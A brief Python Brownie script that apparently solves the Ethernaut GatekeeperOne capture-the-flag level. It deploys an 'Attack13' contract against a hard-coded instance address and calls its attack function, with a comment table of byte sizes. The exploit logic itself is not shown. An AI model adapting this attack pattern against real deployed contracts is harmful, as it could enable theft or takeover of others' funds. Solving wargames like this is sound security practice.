from scripts.helpful_scripts import get_account
from brownie import web3, interface, Attack13


ETHERNAUT_INSTANCE = "0x52D9172066F788070Ca1F74A26F3aD2902282c37"
GAS_LIMIT = 6000000
GAS = 8191


def main():

    player = get_account()
    attack = Attack13.deploy(ETHERNAUT_INSTANCE, {"from": player})
    target = interface.IGatekeeperOne(ETHERNAUT_INSTANCE)

    attack.attack()

    # check that we've won by confirming that 'entrant' = player


# bytes    unit
#   1       8
#   2       16
#   4       32
#   8       64
#   16      128
#   20      160   <-- Ethereum address length
#   32      256
